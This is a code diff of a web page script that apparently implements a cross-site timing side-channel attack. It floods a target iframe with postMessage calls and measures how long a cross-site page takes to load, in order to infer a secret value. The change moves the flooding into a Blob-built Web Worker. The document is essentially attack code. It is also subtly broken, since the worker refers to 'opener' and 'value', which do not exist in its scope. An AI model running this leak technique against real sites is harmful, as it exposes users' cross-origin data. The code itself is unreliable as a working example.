@@ -4,29 +4,22 @@
     <script>
       let target = document.getElementById('target');
       let checker = document.getElementById('checker');
-      
-        
-      async function check(value, attempts = 80000, verify = 5) {
-          let total1;
-          let total2;
-          for(let i=verify; i--;) {
-              total1 += await time('xx', attempts);
-              total2 += await time(value, attempts);
-          }
-          return (total1/verify) < (total2/verify);
+
+      function worker_function() {
+          self.onmessage = function (event) {
+              for(let i=5e5; i--;) opener.target.contentWindow.postMessage(value, '*');
+          } 
       }
 
-      async function spam(attempts, value) {
-        for(let i=attempts; i--;) target.contentWindow.postMessage(value, '*');
-      }
+      const worker = new Worker(URL.createObjectURL(new Blob([`(${worker_function})()`], {type: "text/javascript"})));
 
-      function time(value, attempts) {
+      function time(value) {
         return new Promise(resolve => {
           checker.onload = () => {
             resolve(performance.now() - start);
           };
           let start = performance.now();
-          spam(attempts, value);
+          worker.postMessage("");
           checker.contentWindow.location = "https://ndevtk.github.io/cross-site/";
         });
       }
